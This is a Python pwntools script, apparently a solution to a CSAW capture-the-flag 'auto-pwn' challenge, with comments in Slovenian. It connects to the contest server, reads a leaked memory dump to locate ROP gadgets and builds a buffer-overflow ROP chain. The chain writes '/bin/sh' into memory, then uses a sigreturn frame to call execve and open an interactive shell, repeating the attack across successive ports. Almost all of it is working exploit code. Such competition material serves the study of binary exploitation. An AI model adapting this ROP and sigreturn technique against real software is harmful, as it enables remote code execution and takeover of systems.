from pwn import *
from time import sleep
port = 11021
pw= '13462b403d91edd8c8389517c1eca3ed'
for i in range(1,40):
    print(pw)

    sleep(2)
    context.arch='amd64'
    #p = process('./lol2.bin')
    p = remote("auto-pwn.chal.csaw.io", port)
    #pid = gdb.attach(p, gdbscript="""

    #       b * runChallenge
    #        """)


    p.sendlineafter('> ',pw)
    #sleep(1)

    #tle zacne pljuvat binary
    start_address = '00001270'
    end_address = '00001300'
    main_address = '\nMain is at '

    p.recvuntil(start_address)
    data = p.recvuntil(end_address)
    parsed_data = []

    lines = data.split('\n')
    for line in lines:
        spline = line.split(' ')
        parsed_data.append(''.join(spline[1:9]))

    data_string= ''.join(parsed_data)

    #iskanje opcodeov
    opcodes = {
        "mov": "b80f000000c3905dc3", 
        "ptr": "488902c3905dc3",
        "sys": "0f05c3905dc3",
        "rax": "58c3905dc3",
        "rdx": "5ac3905dc3"
    }
    offset_dict = {}
    sandudin = 0x1421
    for mnem, code in opcodes.items():
        offset = data_string.find(code)
        if offset == -1:
            print("Did not find mnemonic " + mnem)
        else:
            #sandi measure
            offset_dict[mnem] = sandudin -(offset//2 + int(start_address, 16))

            print("E SI MI DOBAR: ",mnem,hex(offset_dict[mnem]))
            #should work?


    p.recvuntil(main_address)
    main = int(p.recvline().replace('\n',''),16)
    bss = main + 0x2c1f

    loop1 = main - offset_dict["mov"]
    loop2 = main - offset_dict["ptr"]
    loop3 = main - offset_dict["sys"]
    loop4 = main - offset_dict["rax"]
    loop5 = main - offset_dict["rdx"]

    padd= 'A' *9
    bin_sh =p64(0x0068732f6e69622f)
    payload1 = padd
    payload1 += p64(loop4)
    payload1 += bin_sh
    payload1 += p64(loop5)
    payload1 += p64(bss)
    payload1 += p64(loop2)

    payload1 += p64(loop1)
    payload1 += p64(loop3)




    frame = SigreturnFrame()
    frame.rax = 0x3b
    frame.rdi = bss
    frame.rsi = 0x0
    frame.rdx = 0x0
    frame.rsp = 0x4141414141
    frame.rip = loop3

    payload1 += str(frame)
    p.sendline(payload1)
    p.sendline('cat message.txt')
    p.interactive()
    pw = raw_input('povej mi nekaj lepega: ')
    port+=1    
    p.shutdown()
    p.close()


p.interactive()
